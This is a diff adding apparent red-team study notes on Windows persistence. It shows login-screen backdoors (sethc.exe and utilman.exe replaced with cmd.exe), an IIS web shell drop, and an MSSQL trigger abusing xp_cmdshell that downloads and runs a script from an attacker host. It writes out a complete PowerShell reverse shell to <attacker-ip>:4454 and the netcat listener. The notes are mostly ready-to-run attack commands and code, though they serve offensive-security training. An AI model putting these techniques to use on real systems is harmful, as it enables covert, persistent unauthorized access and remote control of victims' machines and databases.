@@ -154,3 +154,76 @@
 		- Create an environment variable from `HKCU\Environment` in the registry, use the `UserInitMprLogonScript` entry to point to our payload.
 		- Entry type `REG_EXPAND_SZ` and Data `C:\Windows\revshell4.exe`.
 		- Sign out and log back in to trigger the shell.
+- ## *Backdooring the Login Screen / RDP*
+	- If we have physical access or RDP to the machine, we can backdoor the login screen to access a terminal without having valid credentials.
+	- #### *Sticky Keys*
+		- Allows you to press the buttons of a combination sequentially instead of at the same time, `CTRL` then `ALT` then `Delete` instead of `CTRL+ALT+Delete` at the same time.
+		- To establish persistence using Sticky Keys, abuse a shortcut enabled by default in any Windows system that allows us to activate Sticky Keys by pressing `SHIFT` 5 times.
+		- After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`, by replacing this binary to a payload of ours, we can then trigger it with the shortcut, we can even do this from the login screen before inputting credentials.
+		- We first need to take ownership of the `sethc.exe` file so we could replace it with a copy of `cmd.exe`.
+		- `takeown /f C:\Windows\System32\sethc.exe` then `icacls C:\Windows\System32\sethc.exe /grant Administrator:F`.
+		- `copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe`.
+		- Lock the session and press `SHIFT` 5 times to trigger the CLI.
+	- #### *Utilman*
+		- Built-in Windows application used to provide Ease of Access options during lock screen.
+		- When the Ease of Access button is pressed on the lock screen, it executes `C:\Windows\System32\utilman.exe` with SYSTEM privileges.
+		- If we replace it with a copy of `cmd.exe`, we can bypass the login screen.
+		- Do the same thing as with Sticky Keys, take ownership of the file using `takeown /f C:\Windows\System32\utilman.exe`.
+		- Use `icacls C:\Windows\System32\utilman.exe /grant Administrator:F` to give full control to Administrator account, then replace it with `cmd.exe` using `copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe`.
+		- Trigger the terminal by locking the screen and clicking on the Easy of Access button.
+- ## *Persisting Through Existing Services*
+	- Plant backdoors in services like typical web server setup.
+	- #### *Using Web Shells*
+		- The usual way to achieve persistence in a web server is by uploading a web shell to the web directory, this would grant us privileges of the configured user in IIS which is by default `iis apppool\defaultapppool`.
+		- Although this is an unprivileged user, it has the `SeImpersonatePrivilege` special privilege which provides an easy way to escalate to the Administrator user.
+		- Download a web shell, for example from [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), this is an ASP.NET web shell, move it into the webroot, which is by default is located `C:\inetpub\wwwroot`.
+		- Depending on the transfer method, the file might not allow the web server to access it, grant everyone access with `icacls shell.aspx /grant Everyone:F`.
+		- We could then run commands from the web server by going to `http://<ip>/shell.aspx`.
+	- #### *Using MSSQL as a Backdoor*
+		- A lot of ways to plant backdoors in MSSQL Server, one of them is abusing triggers. Triggers in MSSQL allow you to bind actions to be performed when specific events occur in the database.
+		- Before creating the trigger, we must reconfigure a few things in the database.
+			- Enable the `xp_cmdshell` stored procedure, this allows you to run commands directly in the system's console but comes disabled by default.
+			- To enable it, open `Microsoft SQL Server Management Studio 18`, when asked to authenticate, use Windows Authentication, by default the local Administrator account will have access to all DBs.
+			- Click `New Query` button.
+			- Run the below commands to enable the Advanced Options
+				`sp_configure 'Show Advanced Options', 1;`
+				`RECONFIGURE;`
+				`GO`
+			- Run the below commands to enable the `xp_cmdshell`
+				`sp_configure 'xp_cmdshell', 1;`
+				`RECONFIGURE;`
+				`GO`
+			- Ensure that any website accessing the database can run `xp_cmdshell`, by default, only database users with the `sysadmin` role will be able to do so.
+			- Grant privileges to all users to impersonate the `sa` user, which is the default database administrator
+				`USE master`
+				`GRANT IMPERSONATE ON LOGIN::sa to [Public];`
+			- Configure a trigger
+				- First change to the database required using `USE <DB-NAME>`.
+				- The trigger will use `xp_cmdshell` to execute PowerShell to download and run a `.ps1` file from attacker's web server. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees` table of the `HRDB` database.
+					`CREATE TRIGGER [sql_backdoor]`
+					`ON HRDB.dbo.Employees`
+					`FOR INSERT AS`
+					`EXECUTE AS LOGIN = 'sa'`
+					`EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object Net.WebClient).downloadstring(''http://<attacker-ip>:8000/evilscript.ps1'')"';`
+				- Now create the `evilscript.ps1` which will contain a PowerShell reverse shell
+					`$client = New-Object System.Net.Sockets.TCPClient("<attacker-ip>",4454);`
+					`$stream = $client.GetStream();`
+					`[byte[]]$bytes = 0..65535|%{0};`
+					`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){`
+						`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);`
+						`$sendback = (iex $data 2>&1 | Out-String );`
+						`$sendback2 = $sendback + "PS " + (pwd).Path + "> ";`
+						`$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`
+						`$stream.Write($sendbyte,0,$sendbyte.Length);`
+						`$stream.Flush()`
+					`};`
+					`$client.Close()`
+				- We will need to open 2 terminals to handle the connections involved in the exploit
+					- The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port 8000 for that `python3 -m http.server`.
+					- The second connection will be a reverse shell on port 4454 back to our attacking machine `nc -lvnp 4454`.
+				- Visit the website and insert a new entry to trigger the shell.
+- ## *More Resources* 
+	-  [Hexacorn - Windows Persistence](https://www.hexacorn.com/blog/category/autostart-persistence/)
+    - [PayloadsAllTheThings - Windows Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)
+    - [Oddvar Moe - Windows Persistence Through RunOnceEx](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/)
+    - [PowerUpSQL](https://www.netspi.com/blog/technical/network-penetration-testing/establishing-registry-persistence-via-sql-server-powerupsql/)
